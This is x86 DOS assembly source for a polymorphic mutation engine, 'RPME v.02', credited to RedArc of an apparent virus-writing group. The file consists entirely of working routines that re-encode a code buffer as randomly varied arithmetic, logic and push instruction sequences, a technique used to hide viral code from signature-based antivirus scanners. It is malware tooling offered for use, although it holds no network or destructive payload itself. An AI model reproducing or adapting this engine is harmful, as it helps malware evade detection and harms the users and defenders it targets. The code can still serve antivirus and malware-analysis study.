; Random Push Mutation Engine
;    (c) by RedArc // TAVC
;------------------------------
;     Main procedure RPME
;------------------------------
;Input:
;       DS:SI - source code
;       ES:DI - destion buffer
;       CX    - length to code
;Output:
;       CX    - new length
;Destroy:
;       DI, BX, BP, AX

;                           --- Main generator ---

RPME proc near
    push si
    push ax
    push bx
    push dx
    push di
    cld
    shr cx,1
    jnc CheckOffs
    inc cx
CheckOffs:
    call RPME1
RPME1:
    lodsw
GENERATE_RND:
    mov bx,9
    call RND
SUB_SUBROUTINE:
    cmp dx,0
    jne ADD_SUBROUTINE
    pop bx
    push bx
    call SUB_DOP
    jmp RPME_END
ADD_SUBROUTINE:
    cmp dx,1
    jne XOR_SUBROUTINE
    pop bx
    push bx
    call ADD_DOP
    jmp RPME_END
XOR_SUBROUTINE:
    cmp dx,2
    jne INC_SUBROUTINE
    pop bx
    push bx
    call XOR_DOP
    jmp RPME_END
INC_SUBROUTINE:
    cmp dx,3
    jne DEC_SUBROUTINE
    mov bx,5
    call RND
    mov bp,dx
    call INCAX
    pop bx
    push bx
    call INC_DOP
    jmp RPME_END
DEC_SUBROUTINE:
    cmp dx,4
    jne NEG_SUBROUTINE
    mov bx,5
    call RND
    mov bp,dx
    call DECAX
    pop bx
    push bx
    call INC_DOP
    jmp RPME_END
NEG_SUBROUTINE:
    cmp dx,5
    jne NOT_SUBROUTINE
    mov bx,5
    call RND
    mov bp,dx
    call NEGAX
    pop bx
    push bx
    call INC_DOP
    jmp RPME_END
NOT_SUBROUTINE:
    cmp dx,6
    jne ROL_SUBROUTINE
    mov bx,5
    call RND
    mov bp,dx
    call NOTAX
    pop bx
    push bx
    call INC_DOP
    jmp RPME_END
ROL_SUBROUTINE:
    cmp dx,7
    jne ROR_SUBROUTINE
    mov bx,5
    call RND
    mov bp,dx
    call ROLAX
    pop bx
    push bx
    call INC_DOP
    jmp RPME_END
ROR_SUBROUTINE:
    cmp dx,8
    jne NO_MUTATION
    mov bx,5
    call RND
    mov bp,dx
    call RORAX
    pop bx
    push bx
    call INC_DOP
    jmp RPME_END
NO_MUTATION:
    cmp dx,9
    je YES1
    jmp GENERATE_RND
YES1:
    pop bx
    push bx
    call NOMUT
RPME_END:
    loop RPME1
    pop ax
    push di
    pop cx
    pop di
    sub cx,di
    pop dx
    pop bx
    pop ax
    pop si
    ret
Push_offs equ $-RPME1 ;byte
push_ax  db 050h
push_bx  db 053h
push_cx  db 051h
push_dx  db 052h
push_si  db 056h
push_di  db 057h
Mov_offs equ $-RPME1 ;byte
mov_ax   db 0b8h
mov_bx   db 0bbh
mov_cx   db 0b9h
mov_dx   db 0bah
mov_si   db 0beh
mov_di   db 0bfh
Mov_AxReg equ $-RPME1 ;word
mov ax,ax
mov ax,bx
mov ax,cx
mov ax,dx
mov ax,si
mov ax,di
Xchg_AxReg equ $-RPME1 ;byte
xchg ax,ax
xchg ax,bx
xchg ax,cx
xchg ax,dx
xchg ax,si
xchg ax,di
Xor_AxReg equ $-RPME1 ;word
xor ax,bx
xor ax,cx
xor ax,dx
xor ax,si
xor ax,di
InfoRPME db 'RPME v.02 by RedArc'
RPME endp

;                        --- Carbotage generator ---

;INPUT:    AX
;OUTPUT:   AX, DX (AX+DX=SomeValue)
SUBAX proc near
      mov bx,ax
      call RND
      cmp ax,dx
      jz DIVIZION
SUB1:
      sub ax,dx
      ret
DIVIZION:
      shr dx,1
      jmp short SUB1
SUBAX endp

;INPUT:    AX
;OUTPUT:   AX, DX (AX-DX=SomeValue)
ADDAX proc near
      mov bx,0ffffh
      sub bx,ax
      call RND
      add ax,dx
      ret
ADDAX endp

;INPUT:    AX
;OUTPUT:   AX, DX (AX xor DX = SomeValue)
XORAX proc near
      push bx
      mov bx,0fffeh
      call RND
      xor ax,dx
      pop bx
      ret
XORAX endp

;INPUT:  AX
;        DX (num Reg: 0-AX, 1-BX, 2-CX, 3-DX, 4-SI, 5-DI)
;OUTPUT: AX - new value
;        DX - mirror word
INCAX proc near
      push si
      push bx
      call MB1
MB1:
      pop si
      add si,DEC_Table
      inc ax
      add si,dx
      mov bx,16
      call RND
      cmp dx,8
      jg DHM
      mov dl,byte ptr cs:[si]
      mov dh,90h
      jmp short MBE
DHM:
      mov dh,byte ptr cs:[si]
      mov dl,90h
MBE:
      pop bx
      pop si
      ret
DEC_Table equ $-MB1
      dec ax
      dec bx
      dec cx
      dec dx
      dec si
      dec di
INCAX endp

;INPUT:  AX
;        DX (num Reg: 0-AX, 1-BX, 2-CX, 3-DX, 4-SI, 5-DI)
;OUTPUT: AX - new value
;        DL - mirror word
DECAX proc near
      push si
      push bx
      call MB1_
MB1_:
      pop si
      add si,INC_Table
      dec ax
      add si,dx
      mov bx,16
      call RND
      cmp dx,8
      jg DLM
      mov dh,byte ptr cs:[si]
      mov dl,90h
      jmp short MBO
DLM:
      mov dl,byte ptr cs:[si]
      mov dh,90h
MBO:
      pop bx
      pop si
      ret
INC_Table equ $-MB1_
      inc ax
      inc bx
      inc cx
      inc dx
      inc si
      inc di
DECAX endp

;INPUT:  AX
;        DX (num Reg: 0-AX, 1-BX, 2-CX, 3-DX, 4-SI, 5-DI)
;OUTPUT: AX - new value
;        DX - mirror word
NEGAX proc near
      push si
      call NP1
NP1:
      pop si
      add si,NEG_Table
      shl dx,1
      add si,dx
      neg ax
      mov dx,word ptr cs:[si]
      pop si
      ret
NEG_Table equ $-NP1
      neg ax
      neg bx
      neg cx
      neg dx
      neg si
      neg di
NEGAX endp

;INPUT:  AX
;        DX (num Reg: 0-AX, 1-BX, 2-CX, 3-DX, 4-SI, 5-DI)
;OUTPUT: AX - new value
;        DX - mirror word
NOTAX proc near
      push si
      call NOTP1
NOTP1:
      pop si
      add si,NOT_Table
      shl dx,1
      add si,dx
      not ax
      mov dx,word ptr cs:[si]
      pop si
      ret
NOT_Table equ $-NOTP1
      not ax
      not bx
      not cx
      not dx
      not si
      not di
NOTAX endp

;INPUT:  AX
;        DX (num Reg: 0-AX, 1-BX, 2-CX, 3-DX, 4-SI, 5-DI)
;OUTPUT: AX - new value
;        DX - mirror word
ROLAX proc near
      push si
      call ROL1
ROL1:
      pop si
      add si,ROR_Table
      shl dx,1
      add si,dx
      rol ax,1
      mov dx,word ptr cs:[si]
      pop si
      ret
ROR_Table equ $-ROL1
      ror ax,1
      ror bx,1
      ror cx,1
      ror dx,1
      ror si,1
      ror di,1
ROLAX endp

;INPUT:  AX
;        DX (num Reg: 0-AX, 1-BX, 2-CX, 3-DX, 4-SI, 5-DI)
;OUTPUT: AX - new value
;        DX - mirror word
RORAX proc near
      push si
      call ROR1
ROR1:
      pop si
      add si,ROL_Table
      shl dx,1
      add si,dx
      ror ax,1
      mov dx,word ptr cs:[si]
      pop si
      ret
ROL_Table equ $-ROR1
      rol ax,1
      rol bx,1
      rol cx,1
      rol dx,1
      rol si,1
      rol di,1
RORAX endp

Save_Al proc near
    mov al,byte ptr cs:[si]
    stosb
    ret
Save_Al endp

ADD_SUB proc near
    push bx
    mov bx,5
    call RND
    pop bx
    push bx
    push si
    add bx,Xchg_AxReg
    xchg bx,si
    add si,dx
    call Save_Al
    pop si
    pop bx
    push si
    add bx,Push_offs
    xchg bx,si
    add si,dx
    call Save_Al
    pop si
    ret
ADD_SUB endp

ADD_SUB_0 proc near
    mov bp,dx
    pop dx
    pop bx
    push bx
    push dx
    mov dx,bp
    push si
    xchg bx,si
    add si,Mov_offs
    push ax
    call Save_Al
    pop ax
    stosw
    pop si
    ret
ADD_SUB_0 endp

SAVE_METOD proc near
    stosb
    xchg ax,dx
    stosw
    pop dx
    pop bx
    push bx
    push dx
    call ADD_SUB
    ret
SAVE_METOD endp

XOR_DOP proc near
    push si
    push bx
    call XORAX
    add bx,Mov_offs
    xchg bx,si
    push ax
    call Save_Al
    pop ax
    stosw
    pop bx
    push bx
    push si
    mov si,bx
    mov bx,4
    push dx
    call RND
;!!!
    mov bp,dx
    shl bp,1
    inc dx
;!!!
    add bp,si
    add si,dx
    pop dx
    add si,Mov_offs
    call Save_Al
    xchg ax,dx
    stosw
    pop si
    xchg si,bp
    add si,Xor_AxReg
    mov ax,word ptr cs:[si]
    stosw
    xchg si,bp
    pop bx
    push bx
    push si
    mov si,bx
    mov bx,5
    call RND
    add si,dx
    mov bp,si
    add si,Xchg_AxReg
    call Save_Al
    pop si
    xchg bp,si
    add si,Push_offs
    call Save_Al
    xchg bp,si
    pop bx
    pop si
    ret
XOR_DOP endp

SUB_DOP proc near
    push bx
    call SUBAX
    call ADD_SUB_0
    mov al,05h
    call SAVE_METOD
    pop bx
    ret
SUB_DOP endp

ADD_DOP proc near
    push bx
    call ADDAX
    call ADD_SUB_0
    mov al,2dh
    call SAVE_METOD
    pop bx
    ret
ADD_DOP endp

INC_DOP proc near
;INPUT: BP - uses register (0-AX, 1-BX, 2-CX, ...)
    push si
    push bx
    mov si,bx
    add si,bp
    push ax
    add si,Mov_offs
    call Save_Al
    pop ax
    stosw
    xchg ax,dx
    stosw

    pop si
    add si,Push_offs
    add si,bp
    call Save_Al

    pop si
    ret
INC_DOP endp

NOMUT proc near
    push si
    mov si,bx
    mov bx,5
    call RND
    add si,dx
    mov bp,si
    add si,Mov_offs
    push ax
    call Save_Al
    pop ax
    stosw
    xchg bp,si
    add si,Push_offs
    call Save_Al
    pop si
    ret
NOMUT endp
